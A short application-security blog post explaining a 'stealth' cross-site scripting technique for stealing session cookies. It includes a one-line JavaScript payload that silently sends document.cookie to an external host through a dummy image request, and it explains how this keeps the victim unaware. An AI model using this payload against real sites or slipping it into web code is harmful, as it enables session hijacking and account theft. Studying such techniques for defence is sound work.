title: Stealth Cookie Stealing (XSS technique)
publish: True
categories: [application security]

Everyone knows what XSS is, right? Good, I'll spare you the definition. A common use for XSS is stealing cookies to hijack sessions and gain access to restricted web content. Cookie stealing is typically done by forcing a target's browser to issue some sort of GET request to a server controlled by the attacker which accepts the target's cookie as a parameter and processes it in some way. In most cases, when a cookie stealing XSS attack is successful, it generates a visual clue which can tip off the target. While it is too late at this point, stealth has been compromised, and could be the difference between the user keeping the session active, or clicking 'log out' and rendering your stolen cookie invalid.

![Good ole' fashion cookie stealin'](/images/posts/cookie_monster.jpg)

About a year ago, I came up with a stealth technique for executing cookie stealing XSS attacks that I assumed was common knowledge. But after talking about the technique with several top web app security professionals, I realize that the technique may be more unique than I initially thought. Below is an example of the technique.

``` javascript
javascript:img=new Image();img.src="http://tools.lanmaster53.com/monster.php?cookie="+document.cookie;
```

For those that don't understand exactly what is going on here, basically, I'm using a dummy JavaScript image to launch a GET request. The first part of the script instantiates an image object, and the second part sets the source attribute of the image object. In this example, the source url is what you would use in any other cookie stealing attack. The key here is that once the source attribute is set, the browser fires off the request and stores the response in memory. I never use the instantiated image, the browser doesn't care, and the user is unaware that anything has happened. Stealth is maintained.
